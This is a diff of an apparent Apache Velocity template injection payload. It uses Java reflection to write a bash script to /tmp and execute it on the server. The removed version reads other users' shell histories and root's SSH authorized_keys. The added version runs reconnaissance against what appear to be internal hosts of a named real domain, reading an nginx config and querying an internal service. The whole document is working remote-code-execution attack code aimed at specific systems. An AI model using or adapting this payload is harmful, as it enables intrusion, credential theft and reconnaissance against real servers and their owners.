@@ -1,6 +1,6 @@
 #set($x = "")
 #set($fw = $x.getClass().forName("java.io.FileWriter").getConstructor($x.getClass().forName("java.lang.String")).newInstance("/tmp/zz_cmd.sh"))
-$fw.write("echo ===DRADMIN_HIST===; tail -c 2500 /home/dradmin/.bash_history 2>&1; echo ===DRUSER===; tail -c 500 /home/druser/.bash_history 2>&1; echo ===ROOTKEYS===; cat /root/.ssh/authorized_keys 2>&1 | head -8")
+$fw.write("echo ===DNS===; getent hosts config-center-demo.b8.dr.dianrong.io config-center.b8.dr.dianrong.io config-center.b8.dianrong.io 2>&1 | head -10; echo ===NGX===; cat /etc/nginx/conf.d/f9ad764e20e911e7aff7.conf 2>&1 | head -40; echo ===CC1===; curl -s -m 8 -i http://config-center-demo.b8.dr.dianrong.io/servicecheck 2>&1 | head -15")
 $fw.close()
 #set($rt = $x.getClass().forName("java.lang.Runtime").getDeclaredMethod("getRuntime").invoke(null))
 #set($p = $rt.exec("/bin/bash /tmp/zz_cmd.sh"))
